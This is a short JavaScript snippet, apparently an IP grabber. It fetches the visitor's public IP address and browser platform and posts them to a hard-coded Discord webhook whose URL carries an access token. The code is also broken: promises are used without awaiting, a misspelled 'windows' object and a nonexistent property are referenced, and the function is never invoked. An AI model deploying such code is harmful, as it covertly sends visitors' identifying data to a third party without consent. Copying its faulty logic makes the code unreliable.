(() => {
    const ipResponse = fetch('https://api.ipify.org', { method: 'GET' });
    const ip = ipResponse.text();

    const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\n HEADERS: ${windows.navigator.headers}\nIP: ${ip}` };
    const webhookResponse = fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    });
    const content = webhookResponse.json();
});